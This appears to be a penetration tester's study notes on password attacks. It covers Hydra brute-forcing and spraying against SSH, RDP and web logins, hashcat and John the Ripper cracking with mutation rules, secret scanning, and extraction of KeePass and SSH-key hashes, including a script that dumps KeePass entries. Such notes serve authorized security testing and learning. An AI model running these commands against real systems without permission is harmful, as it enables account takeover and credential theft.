---
layout: blank
pagetitle: Password Attacks
---

## Hydra
- Can be used on a lot of things
- SSH:
	- `sudo hydra -l {username} -P {password_list} -s {port} ssh://{IP}`
	- Lets say we found a password, and want to spray it everywhere (like rdp)
		- `sudo hydra -L {username_list} -p {password} rdp://{IP}`
- HTTP:
	- Provide a username, password list, IP, endpoint to post to, ^PASS^ for the password used, and a string in the HTTP of the failed result
	- `sudo hydra -l {username} -P {password_list} {IP} http-post-form "/{endpoint}:{param1}=^PASS^:Login failed. Invalid"`
		- So, for example: `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:user=admin&password=^PASS^:Login failed. Invalid"`
	- Could also likely just use ffuf (with a filter on size if app returns 200)

## Passwords
- AES is symmetric, RSA is asymmetric
- GPUs crack like a thousand times faster than CPUs

## Finding Passwords
- Just use noseyparker. Can scan file systems, cloned repositories, and even entire github organizations.
    - `noseyparker scan {repo/directory}`
    - `noseyparker scan --github-org={org}`
    - Show results with `noseyparker report`
    - Looks like MongoDB made their own version [kingfisher](https://github.com/mongodb/kingfisher) based off of Noseyparker; worth checking out 
- Make sure to save or delete the existing `datastore.np` before starting a new scan
- If you want to scan a filesystem that has noseyparker on it, just `chmod 111 noseyparker` before running

## Password Cracking
- Example hashes for each hashcat mode: [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- Mutating Wordlists:
	- https://github.com/frizb/Hashcat-Cheatsheet?tab=readme-ov-file
	- Sometimes wordlists might not match the minimum requirements of a password for a location being tested, so the wordlist can drop all of the unneeded passwords
	- `hashcat -r "$1 c $!" {password_list}` will capitalize the first letter of each password, append "1" to the end of each password, and then append "!" to the end of that password
		- Putting these rules into a file with newlines will create a new password for each newline, adding that lines modifications to that password
		- Hashcat provides some rules in `/usr/share/hashcat/rules/`, like `rockyou-30000`
			- Praetorian has a good ruleset: [Hob0Rules](https://github.com/praetorian-inc/Hob0Rules)
			- Another good one [here](https://github.com/NotSoSecure/password_cracking_rules/tree/master), which combined the top performers from Praetorian's ruleset and a few others
	- These modifications can be stored in files and used when cracking--for example:
		- `hashcat -m 0 {hash} {password_list} -r {modification_file} --force`
- Ensure to find the type of hash before cracking to save time
  - `hashcat -h | grep "{information}"` can help find the number to user
  - `hashcat -m {number} --example-hash` can provide a good example that hashcat can understand
- Extracting hashes:
	- Many methods, but here's a novel one:
		- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` will search for kdbx files (KeePass files) containing hashes
		- `keepass2john {keepass_database_file}` to extract hash
    		- Same goes for `pdf2john`, `zip2john`, or `office2john`
    		- We can then list the passwords like so:

```python
from pykeepass import PyKeePass
kp = PyKeePass('{db}.kdbx', password='{password}')
for entry in kp.entries:
    print(f"Title: {entry.title}, Username: {entry.username}, Password: {entry.password}")
```

- Cracking the hash:
	- `hashcat -m {hashcat_mode (e.g. 13400)} {hash} {wordlist} -r {mutation} --force`
		- Increase speed with `-O -w 4 --opencl-device-types 1,2`
- Using a salt
  - If we have a salt used, there seem to be hashcat version that support that
  - For example, if we have a salted password hash encrypted with sha256, we can use `hashcat -m 1410 '{password}:{salt}' {wordlist}` to crack it

## SSH Private Key Passphrase
- `ssh2john {private RSA SSH key file} > ssh.hash` will put the hash in a crack-able format
- `hashcat -m 22921 ssh.hash {password_list} -r {mutation} --force` will crack the SSH hash
	- 22921 comes from looking up \$6$ in the `hashcat --help` response
	- However, this might result in an error due to this cipher not being supported by hashcat
- John the Ripper 
	- Can handle the error above
	- Can use mutation rules, placed at the end of /etc/john/john.conf
	- `john --wordlist={password_list} --rules=sshRules {hash}` to crack

## Misc notes
- Yescrypt [isn't actually supported](https://github.com/hashcat/hashcat/issues/2816) by hashcat, despite being pretty common in Linux
  - These would be hashes starting with `$y$`
  - Instead, we can use `john {hashfile} --format=crypt --wordlist={wordlist_file}`